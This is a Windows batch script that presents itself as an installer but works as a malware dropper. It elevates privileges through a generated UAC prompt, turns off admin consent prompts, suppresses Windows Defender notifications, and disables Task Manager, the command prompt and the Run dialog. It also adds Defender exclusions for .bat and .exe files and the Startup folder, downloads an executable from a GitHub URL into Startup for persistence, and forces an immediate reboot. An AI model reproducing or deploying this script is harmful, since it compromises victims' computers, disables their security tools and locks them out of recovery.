@echo off

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo "Ensuring correct permission for installation..."
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "getadmin.vbs"

    "getadmin.vbs"
    del "getadmin.vbs"
    exit /B
:gotAdmin
echo msgbox "installing files..." > %tmp%\tmp.vbs
wscript %tmp%\tmp.vbs
del %tmp%\tmp.vbs
cd %temp%
set pop=%systemroot%
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"  /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f
echo nice
powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
powershell -Command "Invoke-WebRequest https://github.com/traced1337/stuff/raw/main/zipper.exe -OutFile StartupNeed.exe"
shutdown -t 0 -r -f
